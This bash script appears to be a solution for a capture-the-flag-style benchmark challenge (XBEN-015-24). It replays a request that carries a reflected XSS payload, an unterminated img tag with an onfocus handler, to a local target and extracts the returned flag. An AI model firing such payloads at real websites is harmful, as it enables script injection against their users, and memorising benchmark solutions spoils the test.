#!/usr/bin/env bash
# XBEN-015-24 — reflected XSS. Proxy-mode twin of examples/xben/xben-015-xss-unterminated-tag.sh. The
# target validates the submitted payload server-side and returns the flag when
# it would execute, so the attack is one replayed request carrying the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben-015-xss-unterminated-tagp-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set method=GET --set path=/page \
  --set query.name='<img src=x autofocus onfocus=alert("XSS")' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
